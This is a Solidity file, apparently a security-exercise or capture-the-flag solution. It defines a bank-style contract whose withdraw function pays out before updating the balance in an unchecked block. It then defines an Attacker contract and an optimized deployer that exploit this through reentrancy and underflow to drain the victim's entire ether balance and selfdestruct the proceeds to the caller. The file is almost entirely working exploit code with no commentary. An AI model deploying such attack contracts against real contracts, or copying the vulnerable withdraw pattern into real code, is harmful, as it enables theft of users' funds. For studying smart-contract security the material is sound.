// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.15;

contract Security101 {
    mapping(address => uint256) balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, 'insufficient funds');
        (bool ok, ) = msg.sender.call{value: amount}('');
        require(ok, 'transfer failed');
        unchecked {
            balances[msg.sender] -= amount;
        }
    }
}

contract Attacker {
    address payable internal immutable attacked;

    event Here(bool suc);

    constructor(address payable _attacked) payable {
        attacked = _attacked;
        Security101(_attacked).deposit{value: msg.value}();
    }

    receive() external payable {
        address payable _attacked = attacked;
        uint amt = 1000000000000000000;
        if(address(this).balance > amt) return;

        uint _balance = address(this).balance;
        try Security101(_attacked).withdraw(amt) {} catch {}

        if(_balance == amt) return;

        try Security101(_attacked).withdraw(_attacked.balance) {} catch {}
    }
}

contract OptimizedAttackerSecurity101{
    constructor (address payable _attacked) payable {
        Attacker _attacker = new Attacker{value: msg.value}(_attacked);
        address(_attacker).call('');
        selfdestruct(payable(tx.origin));
    }
}
